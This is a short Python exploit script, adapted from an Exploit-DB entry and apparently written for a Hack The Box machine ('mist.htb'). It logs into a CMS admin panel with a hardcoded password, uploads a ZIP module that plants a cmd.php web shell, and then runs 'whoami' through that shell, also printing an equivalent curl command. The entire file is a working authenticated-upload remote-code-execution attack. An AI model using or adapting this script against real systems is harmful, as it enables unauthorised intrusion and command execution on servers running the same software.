#!/usr/bin/python3
# modified version of: https://www.exploit-db.com/exploits/51592

import requests
from requests_toolbelt.multipart.encoder import MultipartEncoder

file_path = "rce.zip"
url = "http://mist.htb"
login_url = f"{url}/login.php"
upload_url = f"{url}/admin.php?action=installmodule"
headers = {"Referer": login_url,}
login_payload = {"cont1": "lexypoo97","bogus": "","submit": "Log in"}

multipart_data = MultipartEncoder(
    fields={
        "sendfile": (file_path, open(file_path, "rb"), "application/zip"),
        "submit": "Upload"
    }
)

session = requests.Session()
login_response = session.post(login_url, headers=headers, data=login_payload)

if login_response.status_code == 200:
    print("Login account")

 
    upload_headers = {
        "Referer": upload_url,
        "Content-Type": multipart_data.content_type
    }

    proxies = {
    'http': 'http://127.0.0.1:8080'
    }
    upload_response = session.post(upload_url, proxies=proxies, headers=upload_headers, data=multipart_data)
    
    if upload_response.status_code == 200:
        print("ZIP file download.")
    else:
        print("ZIP file download error. Response code:", upload_response.status_code)
else:
    print("Login problem. response code:", login_response.status_code)

rce_url=f"{url}/data/modules/{file_path.replace('.zip','')}/php_module/cmd.php?cmd=whoami"
rce=requests.get(rce_url)
print(rce.text.strip())
print(f'\ncurl -s -G {url}/data/modules/{file_path.replace('.zip','')}/php_module/cmd.php --data-urlencode "cmd=whoami"')            
